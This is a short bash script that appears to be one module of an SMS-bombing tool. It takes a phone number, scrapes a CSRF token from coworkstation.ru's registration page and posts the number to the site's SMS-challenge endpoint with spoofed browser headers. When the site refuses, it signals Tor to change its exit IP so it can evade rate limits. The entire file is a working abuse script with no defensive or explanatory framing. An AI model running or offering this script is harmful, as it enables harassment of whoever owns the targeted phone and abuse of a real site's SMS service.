#!/bin/bash

PHONE="$(echo "$1" | sed -E 's/^\+([0-9]{1,2})([0-9]{3})([0-9]{3})([0-9]{2})([0-9]{2})$/\1+(\2)+\3-\4-\5/')"

echo "+$PHONE"

COOKIEFILE="$RANDOM"cookie.txt

TOKEN=$(curl -s --retry 3 'https://coworkstation.ru/auth/register' -c "$COOKIEFILE" -b "$COOKIEFILE" | grep 'csrf-token' | head -1 | sed -E 's/.*content="([^"]+)".*/\1/')

RESULT=$(curl -s --retry 3 'https://coworkstation.ru/auth/new-sms-challenge' \
-c "$COOKIEFILE" -b "$COOKIEFILE" \
-H 'authority: coworkstation.ru' \
-H 'sec-ch-ua: " Not A;Brand";v="99", "Chromium";v="99", "Google Chrome";v="99"' \
-H 'dnt: 1' \
-H "x-csrf-token: $TOKEN" \
-H 'sec-ch-ua-mobile: ?0' \
-H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36' \
-H 'content-type: application/x-www-form-urlencoded; charset=UTF-8' \
-H 'accept: */*' \
-H 'x-requested-with: XMLHttpRequest' \
-H 'sec-ch-ua-platform: "Windows"' \
-H 'origin: https://coworkstation.ru' \
-H 'sec-fetch-site: same-origin' \
-H 'sec-fetch-mode: cors' \
-H 'sec-fetch-dest: empty' \
-H 'referer: https://coworkstation.ru/auth/register' \
-H 'accept-language: ru-UA,ru;q=0.9' \
--data-raw "phone=%2B$PHONE")

rm -rf "$COOKIEFILE"

if [ "$(echo "$RESULT" | grep -c 'sms_challenge')" = "0" ]; then
  echo "$RESULT"
  echo "false"
  pkill -sighup tor 2>/dev/null
else
  echo "true"
fi
